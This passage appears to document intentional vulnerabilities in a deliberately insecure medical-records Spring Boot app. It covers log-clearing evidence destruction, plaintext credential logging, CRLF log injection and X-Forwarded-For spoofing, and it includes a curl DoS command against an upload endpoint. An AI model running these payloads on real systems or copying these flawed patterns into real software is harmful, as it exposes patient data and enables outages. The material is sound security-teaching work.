| Any OS env var | `DB_PASS`, `JWT_SECRET`, `CLOUD_API_KEY` |

Unlike `/actuator/env` (which masks values with `"******"`), this endpoint returns the actual plaintext values.

---

**65. Security Logging Failure — POST /api/admin/logs/clear destroys audit trail [A09] — `AdminService.java`**
```java
// [A09] Hard delete — no soft-delete, no archive, no immutable backup
long count = auditLogRepository.count();
auditLogRepository.deleteAll();   // permanent, irreversible
```
Impact:
- All evidence of unauthorized access (IDOR reads, role escalation) is permanently destroyed
- HIPAA / GDPR-mandated access logs for medical record reads are erased
- Forensic timeline required for incident response is gone

Attack chain:
1. Exploit IDOR endpoints to harvest patient records and escalate own role to ADMIN
2. `POST /api/admin/logs/clear` → wipe all evidence in a single request
3. Security team finds no log data — the breach is completely undetectable

No role check, no supervisor approval, no immutable audit sink. A PATIENT can call this endpoint.

---

---

## Logging Interceptor — `LoggingInterceptor`, `RequestCachingFilter`, `WebMvcConfig`

### New Files

| File | Description |
|---|---|
| `interceptor/LoggingInterceptor.java` | `HandlerInterceptor` — logs IP, method, URI, params, request/response body, User-Agent, stack trace to `audit_logs` |
| `interceptor/RequestCachingFilter.java` | `OncePerRequestFilter` — wraps every request/response with `ContentCachingRequestWrapper` / `ContentCachingResponseWrapper` so body bytes can be read after Spring MVC consumes them |
| `config/WebMvcConfig.java` | `WebMvcConfigurer` — registers the interceptor on `/**` and the caching filter at order 1 |

### Vulnerabilities

**66. Information Exposure Through Error Message — ex.printStackTrace(pw) [A08 / CWE-209] — `LoggingInterceptor.java`**
```java
if (ex != null) {
    StringWriter sw = new StringWriter();
    PrintWriter pw = new PrintWriter(sw);
    ex.printStackTrace(pw);           // [A08] full JVM stack trace captured
    details.put("stackTrace", sw.toString());  // persisted to audit_logs.details
}
```
The full stack trace is stored in `audit_logs.details` and readable by any caller via `GET /api/admin/logs` (no role check). Exposed information:
- Internal class names and package structure (`com.mediconnect.service.UserService.findById`)
- Framework versions (Spring 3.5.14, Hibernate, Tomcat)
- SQL query text from `JpaSystemException` / `DataAccessException`
- File paths from `IOException` (e.g., `/tmp/mediconnect/uploads/`)
- Full dependency call chain — maps the exact internal architecture for an attacker

---

**67. Sensitive parameters logged without masking [A04 / A09] — `LoggingInterceptor.java`**
```java
// [A04][A09] No redaction of password, token, secret, or key fields
Map<String, String[]> paramMap = request.getParameterMap();
String params = paramMap.entrySet().stream()
        .map(e -> e.getKey() + "=" + String.join(",", e.getValue()))
        .collect(Collectors.joining("; "));
// Stored: params=username=admin; password=secret123;
```
Request body also logged verbatim:
```java
requestBody = new String(ccr.getContentAsByteArray(), StandardCharsets.UTF_8);
// Stored: {"username":"admin","password":"secret123"}  ← plaintext credential in DB
```
Every login attempt ever made through the API is recorded as plaintext in `audit_logs`. A single SQL read on a compromised database yields credentials for every user.

---

**68. Log Injection via unsanitized User-Agent [A05 / CWE-117] — `LoggingInterceptor.java`**
```java
// [A05] No CR/LF stripping before persistence
String userAgent = request.getHeader("User-Agent");  // stored verbatim
```
Attack — inject a fake audit record by crafting the User-Agent header:
```
User-Agent: Mozilla/5.0\r\nACTION: admin granted ADMIN role to user 99
```
When the `audit_logs` table is exported to a SIEM, flat-file log, or CSV report, the injected `\r\n` creates a new line that appears as a legitimate audit event, corrupting the security timeline and enabling an attacker to forge their own alibi or frame another user.

---

**69. Spoofable IP address via X-Forwarded-For [A04] — `LoggingInterceptor.java`**
```java
// [A04] X-Forwarded-For header trusted without validation
String ip = request.getHeader("X-Forwarded-For");
if (ip == null || ip.isBlank()) ip = request.getRemoteAddr();
// Stored verbatim in audit_logs.ip_address
```
An attacker sends `X-Forwarded-For: 127.0.0.1` and their real IP is never recorded. All audit records show `127.0.0.1` as the source, making forensic attribution impossible.

---

**70. Response body logged verbatim — JWT and passwordHash duplicated in audit table [A04] — `LoggingInterceptor.java`**
```java
// [A04] Response body stored in audit_logs — may contain JWT tokens or password hashes
responseBody = new String(ccr.getContentAsByteArray(), StandardCharsets.UTF_8);
// GET /api/users/1 response: {"id":1,"passwordHash":"5f4dcc3b...","role":"ADMIN"}
// POST /api/auth/login response: {"token":"eyJhbGciOiJ..."}
// → both are persisted to audit_logs.details
```
The audit table becomes a secondary credential store. Any SQL injection or database breach that reaches `audit_logs` also yields JWT tokens (valid for 30 days) and MD5 password hashes for every request ever logged.

---

---

## Global Exception Handler — `GlobalExceptionHandler`, `EntityNotFoundException`

### New Files

| File | Description |
|---|---|
| `exception/EntityNotFoundException.java` | Custom `RuntimeException` carrying `id` (Long) and `tableName` (String) |
| `exception/GlobalExceptionHandler.java` | `@RestControllerAdvice` — forwards raw exception messages and type names to the client |

### Vulnerabilities

**71. Internal error messages forwarded to client [A02] — `GlobalExceptionHandler.java`**
```java
// [A02] Raw exception message forwarded verbatim — no sanitization, no generic fallback
@ExceptionHandler(RuntimeException.class)
public ResponseEntity<Map<String, Object>> handleRuntime(RuntimeException ex) {
    body.put("error", ex.getMessage());        // internal service message
    body.put("type",  ex.getClass().getName()); // fully-qualified class name
    ...
}
```
Internal messages exposed through this handler:

| Source | Message forwarded |
|---|---|
| `AuthService` | `"User not found: admin"` — username enumeration |
| `AuthService` | `"Invalid password"` — confirms account exists |
| `AuthService` | `"Account is locked until 2026-05-10T22:00"` — timing oracle |
| `UserService` | `"User not found: 5"` — sequential ID leak |
| `Role.valueOf()` | `"No enum constant com.mediconnect.enums.Role.SUPERADMIN"` — full package path |
| Hibernate constraint | raw SQL column / index names in violation messages |

The `type` field additionally reveals the fully-qualified class name (e.g. `com.mediconnect.service.UserService`), mapping the internal package structure for an attacker.

---

**72. DB table name and PK exposed on 404 [A02] — `GlobalExceptionHandler.java`, `EntityNotFoundException.java`**
```java
// EntityNotFoundException — carries raw persistence details
super("Entity with ID " + id + " not found in table " + tableName);

// GlobalExceptionHandler response:
body.put("error", ex.getMessage()); // "Entity with ID 99 not found in table medical_records"
body.put("id",    ex.getId());      // 99
body.put("table", ex.getTableName()); // "medical_records"
```
Example API response:
```json
GET /api/medical-records/99
→ 404 {
    "error": "Entity with ID 99 not found in table medical_records",
    "id": 99,
    "table": "medical_records",
    "timestamp": "2026-05-10T22:30:00"
  }
```
An attacker learns the exact table name, enabling targeted SQL injection payload construction. Sequential ID enumeration is confirmed by observing which IDs return 404 vs. 200.

---

**73. JVM-level error forwarded to client [A02] — `GlobalExceptionHandler.java`**
```java
@ExceptionHandler(Throwable.class)
public ResponseEntity<Map<String, Object>> handleThrowable(Throwable ex) {
    body.put("error", ex.getMessage());         // e.g. "Java heap space"
    body.put("type",  ex.getClass().getName()); // "java.lang.OutOfMemoryError"
    ...
}
```
If `ContentCachingFilter` triggers an `OutOfMemoryError` (see vulnerability 74), this handler catches it and returns `{"type":"java.lang.OutOfMemoryError","error":"Java heap space"}` — confirming to the attacker that the DoS payload succeeded and the exact JVM failure mode.

---

## Content Caching Filter — `ContentCachingFilter`

### New Files

| File | Description |
|---|---|
| `interceptor/ContentCachingFilter.java` | `@Component` `Filter` — wraps every request/response with `ContentCachingRequestWrapper` / `ContentCachingResponseWrapper` without any size limit |

### Changes

- `config/WebMvcConfig.java` — removed manual `FilterRegistrationBean<RequestCachingFilter>`; body buffering now handled by `ContentCachingFilter` (`@Order(1)`)
- `src/main/resources/application.yaml` — added `spring.servlet.multipart.max-file-size: -1` and `max-request-size: -1`

### Vulnerabilities

**74. Unbounded memory buffering — ContentCachingRequestWrapper without size limit [A08 / CWE-400] — `ContentCachingFilter.java`**
```java
// [A08] Single-argument constructor — no contentCacheLimit, no upper bound
ContentCachingRequestWrapper cachedRequest = new ContentCachingRequestWrapper(httpRequest);
```
`ContentCachingRequestWrapper(HttpServletRequest)` reads the full request body into a `byte[]` on the JVM heap. Combined with unlimited multipart settings:
```yaml
# application.yaml
spring.servlet.multipart.max-file-size: -1    # [A08] no file-size ceiling
spring.servlet.multipart.max-request-size: -1 # [A08] no request-size ceiling
```
Attack — single HTTP request causes Denial of Service:
```bash
curl -X POST https://api.mediconnect.com/api/medical-records/1/attachment \
     -F "file=@/dev/urandom" \   # infinite random byte stream
     -H "Transfer-Encoding: chunked"
```
The JVM allocates heap until `java.lang.OutOfMemoryError: Java heap space` is thrown, taking the entire application offline. No authentication required (SecurityConfig `permitAll()`).

Secure fix:
```java
// Two-argument constructor with a reasonable cap
new ContentCachingRequestWrapper(request, 64 * 1024);  // 64 KB
```
```yaml
spring.servlet.multipart.max-file-size: 10MB
spring.servlet.multipart.max-request-size: 15MB
```

---

**75. Response body buffered without limit [A08 / CWE-400] — `ContentCachingFilter.java`**
```java
// [A08] Entire response body held in heap simultaneously with the controller's output
ContentCachingResponseWrapper cachedResponse = new ContentCachingResponseWrapper(httpResponse);
```
A large `GET /api/users` response returning 50 000 records is held in heap twice: once by the JPA result set and once by the wrapper. Combined with a large request body in the same request, effective heap pressure is doubled.

---

## OWASP Category Summary

| ID | Category | Where |
|---|---|---|
| A01 | Broken Access Control | `SecurityConfig.java` (`permitAll` on `/api/admin/**`); `UserController.java` (IDOR, mass assignment on role, all users exposed); `AppointmentController.java` (IDOR); `MedicalRecordController.java` (any doctor for any patient); `LabResultController.java` (IDOR); `MessageController.java` (conversation IDOR, delete without ownership check); `AdminController.java` (admin endpoints open to all callers) |
| A02 | Cryptographic Failures | `application.yaml`, `V10` (MD5 seed), `JwtUtil.java` (weak key), `SecurityConfig.java` (NoOpPasswordEncoder, no security headers); `MedicalRecordController.java` (filesystem path in response); `AdminController.java` (`GET /config` exposes raw datasource.password and all env vars); `GlobalExceptionHandler.java` (raw exception messages + fully-qualified class names + DB table names forwarded to client) |
| A03 | Injection / File Upload | `MedicalRecordService.java` (unrestricted upload + Path Traversal write via `getOriginalFilename()`; Path Traversal read via `filePath` param); `LabResultService.java` (predictable filename without UUID; Path Traversal read via `filePath` param) |
| A04 | Insecure Design | `V2` (PII plaintext), `User.java` (passwordHash in response), `PasswordUtils.java` (MD5, timing attack), `AuthController.java` (JWT in body); `UserService.java` (passwordHash in every response); `LoggingInterceptor.java` (password params + response body logged verbatim, spoofable IP from X-Forwarded-For) |
| A05 | Injection / XSS | `SecurityConfig.java` (wildcard CORS, no security headers), `V8` + `Message.java` (Stored XSS); `AppointmentService.java` (SQL injection via `doctorName`); `LabResultService.java` (4×SQLi: 3 string params + 1 numeric UNION without closing quotes); `MessageService.java` (Stored XSS via unsanitized content); `LoggingInterceptor.java` (Log Injection via unsanitized User-Agent CR/LF) |
| A06 | Security Misconfiguration / Missing Business Logic | `AppointmentService.java` (no state machine on status transitions); `PrescriptionService.java` (double dispensing allowed, any status transition allowed including `CANCELLED → DISPENSED`) |
| A07 | Auth Failures / Mass Assignment | `JwtUtil.java` (30-day expiry, algorithm confusion), `JwtAuthenticationFilter.java` (skip expiry paths, swallowed exceptions), `AuthService.java` (user enumeration, no rate limiting), `CustomUserDetailsService.java` (user enumeration), all `*Dto.java`; `UserController.java` (`GET /delete/{id}` — delete via GET); `MessageService.java` (sender spoofing); `PrescriptionService.java` (pharmacistId from body); `AdminController.java` (role from body → instant ADMIN creation) |
| A08 | Software and Data Integrity Failures / Resource Exhaustion | `pom.xml` (JJWT CVE-2024-31033), `MedicalRecord.java` (no content_hash); `AppointmentController.java` (PDF without Content-MD5); `MedicalRecordService.java` (no hash computed at upload); `LoggingInterceptor.java` (`ex.printStackTrace(pw)` — full JVM stack trace persisted to DB, CWE-209); `ContentCachingFilter.java` + `application.yaml` (unbounded heap buffering, CWE-400 DoS via single oversized request) |
| A09 | Security Logging and Monitoring Failures | `AdminController.java` (`POST /logs/clear` permanently deletes entire audit trail without authorization — evidence destruction attack); `LoggingInterceptor.java` (plaintext passwords and JWT tokens stored in audit_logs; logging errors silently swallowed) |
